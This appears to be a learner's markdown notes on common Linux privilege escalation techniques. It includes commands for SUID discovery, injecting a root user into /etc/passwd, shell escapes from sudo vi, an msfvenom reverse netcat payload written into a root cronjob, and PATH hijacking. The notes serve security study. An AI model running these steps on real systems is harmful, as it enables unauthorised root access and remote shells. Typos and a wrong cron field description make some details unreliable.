# <center>Common Linux Privsec<center>

### Use <strong>LinEnum</strong> script

- https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

### How to get LinEnum on target machine?

1. Use python server (python3 -m http.server) and then use wget command on target.
2. Copy-paste the entire script code in a file in target machine and make it executable.

### Understanding LinEnum Output

Output broken down into different sections:
- Kernel
- can we read/write sensitive files
- SUID files
- Crontab contents.

### Abusing SUID/GUID files

If special permission is set to files, orgivenn to user, it becomes SUID(Set User ID) with extra bin "4" and becomes GUID (Set group ID) with extra bin "2".

`
SUID: rws-rwx-rwx
GUID: rwx-rws-rwx
`
#### Finding SUID manually:
``` bash
find / -perm -u=s -type f 2>/dev/null
```
- find : initiates find command
- / : searches whole file system
- -perm : searches for file with specific permission
- -u=s : any of the permission bits mode are set.
- -tppe f : only searchfor files
- 2> /dev/null : supresses errors.

### Exploiting writeable /etc/passwd

#### /etc/passwd stores the content in following format:
```bash
test:x:0:0:root:/root:/bin/bash
```
1. username -> test
2. password -> stored as x in /etc/shadow
3. User ID (UID) -> 0 for root, 1-99 for predefined accounts, 100-999 for system & administrative accounts/groups
4. Group IID (GID) : primary group ID, stored in /etc/group file
5. user ID info -> root
6. Home directory
7. Command shell

### Write a new root user in /etc/passwd file .
1. Genetrate password.
    ```bash
    openssl passwd -1 -salt [salt] [password]
    ```
2. Add the output in /etc/passwd file in approprite format.
3. Login to root using ` su [username]` command.

voilà, you are logged in as root.

### Escaping VI editor

- `sudo -l` command is used to list what commands youu're able to use as a superuser on that account

- If VI is allowed to run as root, start vi editor using sudo vi command. then get the shell with `:!sh`.

### Exploiting crontab

- `cat /etc/crontab` : view active cronjobs.
- format of cronjob: `# m h dom mon dow user command`
    - \# = id
    - m = month
    - h = hour
    - dom = Day of month
    - mon = Month
    - dow = Day of week
    - user = What user the command will run as
    - command = What command should be run

- example : `17 * 1 * * * root cd / && run-parts --report /etc/sron.hourly`

- If a cronjob is found that runs as root, we can edit the script to get shell.
    ```bash
    msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=1234 R > MSFVENOM_OUTPUT;
    cat MSFVENOM_OUTPUT > [CRONJOB_FILE];
    nc -lnvp 1234 (on local system);
    ```

### Exploiting PATH varaiable

- create an imitable executable file in /tmp.

    ` echo "[whatever command we want to run]" > [name of the executable we're imitating]`

- change the path variable:

    `export PATH=/tmp:$PATH`

- to change back path variable, use

    `export PATH=/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/sbin:/sbin:/bin:/usr/local/games:/usr/games:$PATH`